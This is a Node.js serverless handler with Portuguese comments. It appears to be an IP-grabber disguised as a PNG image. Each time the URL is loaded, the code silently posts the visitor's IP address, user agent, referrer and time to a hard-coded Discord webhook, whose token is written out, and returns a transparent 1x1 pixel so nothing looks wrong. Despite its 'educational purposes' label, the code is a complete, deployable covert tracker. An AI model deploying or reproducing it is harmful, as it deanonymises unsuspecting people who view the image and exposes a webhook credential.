export default async function handler(req, res) {
  // COLOQUE SEU WEBHOOK DO DISCORD AQUI
  const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1455977764501983316/U7XD9SM7LTMxccHyeLQud41lpenMRxd3hr9URi5_vxlIi58JouW5RFkQ5A7QAce_XdeA';
  
  try {
    // Captura o IP do visitante
    const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || 
               req.headers['x-real-ip'] || 
               req.connection.remoteAddress || 
               req.socket?.remoteAddress || 
               'IP não detectado';
    
    const userAgent = req.headers['user-agent'] || 'Não informado';
    const referer = req.headers['referer'] || 'Direto';
    const timestamp = new Date().toISOString();
    
    // Envia para Discord Webhook
    if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.includes('discord.com')) {
      const discordMessage = {
        content: null,
        embeds: [{
          title: "🖼️ Imagem PNG Acessada",
          color: 3066993, // Verde
          fields: [
            {
              name: "🌐 IP",
              value: `\`\`\`${ip}\`\`\``,
              inline: true
            },
            {
              name: "📅 Data/Hora",
              value: `<t:${Math.floor(Date.now() / 1000)}:R>`,
              inline: true
            },
            {
              name: "🔗 Referência",
              value: referer.length > 50 ? `${referer.substring(0, 50)}...` : referer,
              inline: false
            },
            {
              name: "🕵️ User Agent",
              value: `\`\`\`${userAgent.substring(0, 80)}\`\`\``,
              inline: false
            }
          ],
          footer: {
            text: "Tracker PNG Fake • Fins Educacionais"
          }
        }]
      };
      
      // Envia para Discord sem esperar resposta
      fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(discordMessage)
      }).catch(() => {});
    }
    
    // Cria uma imagem PNG fake (1x1 pixel transparente)
    const pngBuffer = Buffer.from(
      '89504E470D0A1A0A0000000D494844520000000100000001010300000025DB56' +
      'CA00000003504C5445000000A77A3DDA0000000174524E530040E6D866000000' +
      '0A4944415408D76360000000020001E221BC330000000049454E44AE426082',
      'hex'
    );
    
    // Define headers como se fosse uma imagem PNG real
    res.setHeader('Content-Type', 'image/png');
    res.setHeader('Content-Length', pngBuffer.length);
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    
    // Envia a imagem PNG fake
    res.status(200).send(pngBuffer);
    
  } catch (error) {
    console.error('Erro:', error);
    // Se der erro, ainda retorna uma imagem vazia
    res.setHeader('Content-Type', 'image/png');
    res.send(Buffer.from('89504E470D0A1A0A0000000D49484452000000010000000108060000001F15C4890000000D49444154185763F8FFFF3F000005FE02FEDC6F98650000000049454E44AE426082', 'hex'));
  }
}
